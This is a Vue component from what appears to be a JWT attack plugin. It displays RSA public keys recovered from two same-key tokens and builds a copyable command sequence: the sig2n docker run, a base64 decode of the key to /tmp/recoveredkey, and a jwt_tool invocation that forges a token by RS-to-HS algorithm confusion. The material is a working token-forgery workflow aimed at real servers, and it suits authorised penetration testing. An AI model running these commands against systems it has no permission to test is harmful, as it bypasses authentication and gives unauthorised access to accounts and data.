<template>
  <div class="h-full overflow-y-auto text-sm">
    <div class="px-4 py-3 border-b border-gray-700">
      <h3 class="text-sm font-semibold text-yellow-300">🔑 RSA public-key recovery</h3>
      <p class="text-xs text-gray-500 mt-0.5">
        Recovers the server's RSA public key from two same-key JWTs (silentsignal rsa_sign2n /
        jwt_forgery.py), computed in-browser with gmp-wasm, then used for an algorithm-confusion attack.
      </p>
    </div>

    <!-- Recovered key(s) -->
    <section class="px-4 py-3 border-b border-gray-700">
      <p class="text-xs text-gray-500 uppercase tracking-wide mb-1">Recovered public key(s)</p>
      <div v-if="keys.length">
        <div v-for="(k, i) in keys" :key="i" class="mb-3">
          <div class="text-xs text-green-300 mb-1">✓ {{ k.bits }}-bit modulus (e={{ k.e }})</div>
          <pre class="bg-gray-900 rounded p-2 text-xs text-green-200 overflow-x-auto whitespace-pre-wrap break-all select-all">{{ k.pem }}</pre>
        </div>
      </div>
      <p v-else class="text-xs text-gray-400">
        No key recovered yet. Recovery needs ≥2 <strong>distinct</strong> RS256/384/512 JWTs signed by the
        <strong>same</strong> key (different <code>header.payload</code>). See the log below.
      </p>
    </section>

    <!-- Candidate JWTs -->
    <section class="px-4 py-3 border-b border-gray-700">
      <p class="text-xs text-gray-500 uppercase tracking-wide mb-1">
        Candidate JWTs from history ({{ candidates.length }})
      </p>
      <div v-if="candidates.length" class="space-y-2">
        <div v-for="(jwt, i) in candidates" :key="i">
          <div class="text-xs text-gray-400 mb-0.5">JWT {{ i + 1 }}</div>
          <pre class="bg-gray-900 rounded p-2 text-xs text-cyan-300 overflow-x-auto whitespace-pre-wrap break-all select-all">{{ jwt }}</pre>
        </div>
      </div>
      <p v-else class="text-xs text-gray-400">No candidate JWTs.</p>
    </section>

    <!-- Recovery log -->
    <section class="px-4 py-3 border-b border-gray-700">
      <p class="text-xs text-gray-500 uppercase tracking-wide mb-1">Recovery log</p>
      <pre class="bg-gray-900 rounded p-2 text-xs text-yellow-200 overflow-x-auto whitespace-pre-wrap break-all max-h-60 overflow-y-auto">{{ log.join("\n") }}</pre>
    </section>

    <!-- Reproduce with jwt_tool -->
    <section class="px-4 py-3">
      <div class="flex items-center justify-between mb-1">
        <p class="text-xs text-gray-500 uppercase tracking-wide">Reproduce with jwt_tool</p>
        <button @click="copyRepro" class="text-xs text-gray-400 hover:text-blue-400 transition-colors">
          {{ copied ? "✓ Copied" : "Copy" }}
        </button>
      </div>
      <pre class="bg-gray-900 rounded p-2 text-xs text-cyan-300 overflow-x-auto max-h-72 overflow-y-auto whitespace-pre-wrap break-all select-all">{{ repro }}</pre>
      <p class="text-xs text-gray-500 mt-1">
        <code>portswigger/sig2n</code> is the Dockerised rsa_sign2n. It prints candidate X.509 keys; this
        plugin already recovered the matching one (shown above), so step 2 uses it directly.
      </p>
    </section>
  </div>
</template>

<script setup lang="ts">
import { computed, ref } from "vue";
import type { AttackSession } from "../types.js";

const props = defineProps<{ session: AttackSession | null }>();

const log = computed(() => props.session?.keyRecoveryLog ?? []);
const candidates = computed(() => props.session?.recovery?.candidates ?? []);
const keys = computed(() => props.session?.recovery?.keys ?? []);
const originalJWT = computed(() => props.session?.recovery?.originalJWT ?? "<original-JWT>");

// PEM (base64 over multiple lines) → single base64 line (the X.509 DER), matching
// what sig2n emits and what `base64 -d` expects.
function pemToB64(pem: string): string {
  return pem.replace(/-----[^-]+-----/g, "").replace(/\s+/g, "");
}

const repro = computed(() => {
  const c = candidates.value;
  const jwt1 = c[0] ?? "<JWT-token1>";
  const jwt2 = c[1] ?? "<JWT-token2>";
  const b64 = keys.value[0]?.pem ? pemToB64(keys.value[0].pem) : "<base64-encoded-x509-key-from-sign2n>";
  return [
    "# 1. Recover candidate public keys from two same-key JWTs:",
    `docker run --rm -it portswigger/sig2n ${jwt1} ${jwt2}`,
    "",
    "# 2. Write the recovered X.509 public key to a file:",
    `echo -n ${b64} | base64 -d > /tmp/recoveredkey`,
    "",
    "# 3. Forge a token via algorithm confusion (RS->HS) with the recovered key:",
    `python3 jwt_tool.py ${originalJWT.value} -X k -pk /tmp/recoveredkey`,
  ].join("\n");
});

const copied = ref(false);
async function copyRepro() {
  await navigator.clipboard.writeText(repro.value);
  copied.value = true;
  setTimeout(() => { copied.value = false; }, 1500);
}
</script>
